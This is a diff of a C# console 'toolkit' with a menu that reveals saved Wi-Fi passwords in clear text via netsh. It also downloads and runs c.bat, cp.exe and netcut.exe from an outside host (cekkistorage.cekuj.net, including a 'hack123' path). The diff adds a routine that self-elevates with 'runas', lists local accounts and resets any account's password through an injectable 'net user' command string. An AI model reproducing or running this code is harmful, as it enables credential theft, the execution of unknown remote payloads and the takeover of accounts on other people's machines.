@@ -1,13 +1,14 @@
 using System;
 using System.Diagnostics;
 using System.Net;
+using System.Security.Principal;
 
 class Program
 {
-    private const string Version = "1.2.0";
+    private const string Version = "1.1.0";
     static void Main(string[] args)
     {
-    string[] options = { "Wi-Fi Password", "c.bat (download & run)", "cp.exe (download & run)", "netcut.exe (download & run)", "Exit" };
+        string[] options = { "Retrieve Wi-Fi Password", "Download and Run c.bat", "Download and Run cp.exe", "Download and Run netcut.exe", "Change User Password", "Exit" };
         int selectedIndex = 0;
 
         Console.CursorVisible = false;
@@ -59,32 +60,33 @@ class Program
 
     static void HandleOption(int index, string[] options)
     {
-        if (index == 0)
+        switch (index)
         {
-            GetWifiPassword();
-        }
-        else if (index == 1)
-        {
-            DownloadAndRunCBat();
-        }
-        else if (index == 2)
-        {
-            RunCPCommand();
-        }
-        else if (index == 3)
-        {
-            NetCut();
-        }
-        else if (index == 4)
-        {
-            Console.WriteLine("Exiting...");
-            Environment.Exit(0);
+            case 0:
+                GetWifiPassword();
+                break;
+            case 1:
+                DownloadAndRunCBat();
+                break;
+            case 2:
+                RunCPCommand();
+                break;
+            case 3:
+                NetCut();
+                break;
+            case 4:
+                ChangeUserPassword();
+                break;
+            case 5:
+                Console.WriteLine("Exiting the program.");
+                Environment.Exit(0);
+                break;
         }
     }
 
     static void GetWifiPassword()
     {
-        Console.WriteLine("Listing all WiFi profiles...");
+        Console.WriteLine("Retrieving Wi-Fi passwords...");
         Process process = new Process();
         process.StartInfo.FileName = "cmd.exe";
         process.StartInfo.Arguments = "/C netsh wlan show profiles";
@@ -99,7 +101,7 @@ class Program
 
         Console.WriteLine(output);
 
-        Console.WriteLine("Enter the WiFi name (SSID) to get the password: ");
+        Console.WriteLine("Enter the Wi-Fi name (SSID) to retrieve the password: ");
         string wifiName = Console.ReadLine();
         process.StartInfo.Arguments = $"/C netsh wlan show profile name=\"{wifiName}\" key=clear";
         process.Start();
@@ -113,34 +115,34 @@ class Program
             {
                 if (line.Contains("Key Content"))
                 {
-                    Console.WriteLine($"WiFi Password: {line.Split(':')[1].Trim()}");
+                    Console.WriteLine($"Wi-Fi Password: {line.Split(':')[1].Trim()}");
                     break;
                 }
             }
         }
         else
         {
-            Console.WriteLine("WiFi password not found or not available.");
+            Console.WriteLine("Password could not be retrieved.");
         }
 
         Console.ReadKey();
     }
 
-     static void DownloadAndRunCBat()
+    static void DownloadAndRunCBat()
     {
         try
         {
-            Console.WriteLine("\nDownloading and running c.bat...");
+            Console.WriteLine("Downloading and running c.bat...");
 
             string command = "curl cekkistorage.cekuj.net/c.bat -o c.bat && c.bat";
 
-            var processInfo = new System.Diagnostics.ProcessStartInfo("cmd", $"/c {command}")
+            var processInfo = new ProcessStartInfo("cmd", $"/c {command}")
             {
                 UseShellExecute = false,
                 CreateNoWindow = false
             };
 
-            var process = new System.Diagnostics.Process { StartInfo = processInfo };
+            var process = new Process { StartInfo = processInfo };
             process.Start();
             process.WaitForExit();
 
@@ -151,9 +153,10 @@ class Program
             Console.WriteLine($"An error occurred: {ex.Message}");
         }
 
-        Console.WriteLine("\nPress any key to return to the menu...");
+        Console.WriteLine("Press any key to return to the menu...");
         Console.ReadKey();
     }
+
     static void RunCPCommand()
     {
         Console.WriteLine("Downloading and running cp.exe...");
@@ -168,12 +171,12 @@ class Program
         }
         catch (Exception ex)
         {
-            Console.WriteLine($"Error: {ex.Message}");
+            Console.WriteLine($"An error occurred: {ex.Message}");
         }
 
         Console.ReadKey();
     }
-    
+
     static void NetCut()
     {
         Console.WriteLine("Downloading and running netcut.exe...");
@@ -182,15 +185,121 @@ class Program
             using (var client = new WebClient())
             {
                 client.DownloadFile("http://cekkistorage.cekuj.net/hack123/netcut.exe", "netcut.exe");
-                Console.WriteLine("netcut.exe downloaded successfully.");
+                Console.WriteLine("netcut.exe downloaded and ready to execute.");
                 Process.Start("netcut.exe");
             }
         }
         catch (Exception ex)
         {
-            Console.WriteLine($"Error: {ex.Message}");
+            Console.WriteLine($"An error occurred: {ex.Message}");
         }
 
         Console.ReadKey();
     }
+
+static void ChangeUserPassword()
+{
+    if (!IsUserAdministrator())
+    {
+        Console.WriteLine("This operation requires administrator privileges. Restarting with elevated privileges...");
+        try
+        {
+            var processInfo = new ProcessStartInfo
+            {
+                FileName = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName,
+                UseShellExecute = true,
+                Verb = "runas"
+            };
+
+            Process.Start(processInfo);
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine($"Failed to restart with administrator privileges: {ex.Message}");
+        }
+        return;
+    }
+
+    Console.WriteLine("Retrieving user accounts on this system...");
+
+    try
+    {
+        var listUsersProcess = new Process
+        {
+            StartInfo = new ProcessStartInfo
+            {
+                FileName = "cmd.exe",
+                Arguments = "/c net user",
+                RedirectStandardOutput = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            }
+        };
+
+        listUsersProcess.Start();
+        string output = listUsersProcess.StandardOutput.ReadToEnd();
+        listUsersProcess.WaitForExit();
+
+        Console.WriteLine("List of users:");
+        Console.WriteLine(output);
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"An error occurred while retrieving user accounts: {ex.Message}");
+        Console.WriteLine("Press any key to return to the menu...");
+        Console.ReadKey();
+        return;
+    }
+    Console.Write("Enter the username for which you want to change the password: ");
+    string username = Console.ReadLine();
+
+    Console.Write("Enter the new password (this will be visible): ");
+    string password = Console.ReadLine();
+
+    try
+    {
+        string command = $"net user {username} {password}";
+        Console.WriteLine($"Executing command: {command}");
+
+        var changePasswordProcess = new Process
+        {
+            StartInfo = new ProcessStartInfo
+            {
+                FileName = "cmd.exe",
+                Arguments = $"/c {command}",
+                RedirectStandardOutput = true,
+                RedirectStandardError = true,
+                UseShellExecute = false,
+                CreateNoWindow = true
+            }
+        };
+
+        changePasswordProcess.Start();
+        string output = changePasswordProcess.StandardOutput.ReadToEnd();
+        string errorOutput = changePasswordProcess.StandardError.ReadToEnd();
+        changePasswordProcess.WaitForExit();
+
+        if (string.IsNullOrWhiteSpace(errorOutput))
+        {
+            Console.WriteLine($"Password for user '{username}' has been changed successfully.");
+        }
+        else
+        {
+            Console.WriteLine($"Failed to change password. Error: {errorOutput}");
+        }
+    }
+    catch (Exception ex)
+    {
+        Console.WriteLine($"An error occurred: {ex.Message}");
+    }
+
+    Console.WriteLine("Press any key to return to the menu...");
+    Console.ReadKey();
+}
+static bool IsUserAdministrator()
+{
+    var identity = WindowsIdentity.GetCurrent();
+    var principal = new WindowsPrincipal(identity);
+    return principal.IsInRole(WindowsBuiltInRole.Administrator);
+}
 }
